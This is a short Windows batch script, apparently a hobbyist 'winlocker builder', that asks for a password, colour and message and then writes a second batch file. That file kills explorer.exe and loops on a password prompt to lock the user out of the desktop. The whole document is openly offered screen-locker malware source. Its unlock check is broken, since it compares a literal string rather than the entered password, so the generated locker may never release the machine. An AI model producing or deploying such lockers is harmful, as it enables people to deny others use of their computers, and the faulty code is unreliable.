@echo off
title BUILDER BY KRYYAA\\
echo winlocker builder by kryyaa!!
echo see more on github: kryyyaaaa
TIMEOUT /T 4 /NOBREAK
cls
echo Builder ver0.9.2!
TIMEOUT /T 1 /NOBREAK >nul
set /p name=name for winlocker: 
set /p col=color for winlocker: 
set /p pa=password for winlocker: 
set /p titl=title for winlocker: 
set /p txt=text for winlocker: 

(echo.@echo off
echo.color %col%
echo.title %titl%
echo.:vir
echo.taskkill /f /im explorer.exe
echo.cls
echo.echo %txt%
echo.set /p pass=password: 
echo.if pass == %pa% goto done
echo.echo wrong password!
echo.timeout /t 1 /nonebreak >nul
echo.goto vir
echo.:done
echo.start explorer.exe )>%name%.bat

echo created!
start REEDME.txt
TIMEOUT /T 4 /NOBREAK >nul